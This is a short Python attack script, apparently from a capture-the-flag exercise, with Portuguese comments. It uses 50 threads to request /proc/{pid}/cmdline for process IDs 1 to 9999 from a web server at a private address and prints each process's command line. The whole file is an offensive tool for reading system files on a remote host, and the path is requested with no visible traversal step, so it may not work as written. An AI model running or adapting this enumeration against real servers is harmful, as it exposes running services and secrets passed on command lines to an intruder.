#!/usr/bin/python3
import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://10.10.11.125"

def b(pid):
    r = requests.get(f"{url}/proc/{pid}/cmdline")
    if r.status_code == 200:
        print(f"[+] Process {pid} command line:")
        print(r.text)
    else:
        print(f"[-] Failed to retrieve command line for process {pid}")

# Gera uma lista de IDs de processo de 1 a 9999
process_ids = list(range(1, 10000))

# Define o número máximo de threads
max_workers = 50

# Cria ThreadPoolExecutor com max_workers threads
with ThreadPoolExecutor(max_workers=max_workers) as ex:
    # Mapeia a função b para cada ID de processo na lista
    ex.map(b, process_ids)
